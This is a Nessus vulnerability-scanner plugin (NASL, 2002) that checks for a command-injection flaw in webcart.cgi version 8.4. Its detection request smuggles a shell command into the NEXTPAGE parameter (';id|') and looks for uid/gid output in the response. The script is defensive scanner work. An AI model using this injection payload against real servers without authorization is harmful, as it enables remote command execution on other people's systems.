# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# References:
# Date:  Fri, 19 Oct 2001 03:29:24 +0000
# From: root@xpteam.f2s.com
# To: bugtraq@securityfocus.com
# Subject: Webcart v.8.4


if(description)
{
 script_id(11095);
 script_version ("$Revision: 1.5 $");
 script_bugtraq_id(3453);
 
 name["english"] = "webcart.cgi";
 script_name(english:name["english"]);
 
 desc["english"] = "
webcart.cgi is installed and does not properly filter user input.
A cracker may use this flaw to execute any command on your system.

Solution : Upgrade your software or firewall your web server

Risk factor : High";


 desc["francais"] = "
webcart.cgi est installé et ne filtre pas les entrées de l'utilisateur.
Un pirate peut utiliser cette faille pour lancer n'importe quelle
commande sur votre système.

Solution : Mettez à jour ce logiciel ou protégez votre serveur web

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Detects webcart.cgi";
 summary["francais"] = "Détecte webcart.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");

port = is_cgi_installed("webcart/webcart.cgi");
if (! port) exit(0);

soc = http_open_socket();
if(!soc)exit(0);

req = http_get(port: port, item: "/cgi-bin/webcart/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;id|&CODE=PHOLD");

send(socket: soc, data: req);
buf = http_recv(socket: soc);
http_close_socket(soc);

if (("uid=" >< buf) && ("gid=" >< buf))
{
	security_hole(port);
	exit(0);
}


m = "
webcart.cgi was found on this server.
Some versions (8.4 at least) allowed did not properly filter user input.
A cracker might use this flaw to execute any command on your system.

** Nessus was unable to exploit the flaw or to check the CGI version.

Solution : If necessary, upgrade your software

Risk factor : None / High";

security_warning(port: port, data: m);
